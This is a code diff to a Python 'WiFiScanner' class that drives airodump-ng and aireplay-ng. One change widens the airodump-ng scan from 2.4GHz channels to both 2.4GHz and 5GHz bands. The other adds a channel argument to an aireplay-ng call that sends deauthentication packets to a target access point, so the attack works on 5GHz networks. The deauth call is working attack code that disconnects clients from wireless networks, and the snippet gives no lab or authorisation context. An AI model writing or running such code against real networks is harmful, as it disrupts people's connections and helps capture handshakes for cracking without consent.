@@ -141,12 +141,12 @@ class WiFiScanner:
                 # Start airodump-ng in background mode
                 # --output-format csv: CSV output only
                 # -w: write to file
-                # Scan channels 1-13 (2.4GHz)
+                # Scan both 2.4GHz (1-13) and 5GHz (36-165) channels
                 process = subprocess.Popen([
                     'airodump-ng',
                     '--output-format', 'csv',
                     '-w', scan_file,
-                    '--channel', '1,2,3,4,5,6,7,8,9,10,11,12,13',
+                    '--band', 'abg',  # a=5GHz, b/g=2.4GHz
                     self.interface
                 ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                 
@@ -385,10 +385,12 @@ class WiFiScanner:
             # Send deauth packets
             # -0: deauth count
             # -a: AP MAC
+            # --channel: specify channel (required for 5GHz)
             result = subprocess.run([
                 'aireplay-ng',
                 '--deauth', '10',
                 '-a', bssid,
+                '--channel', str(channel),
                 self.interface
             ], capture_output=True, text=True, timeout=30)
             
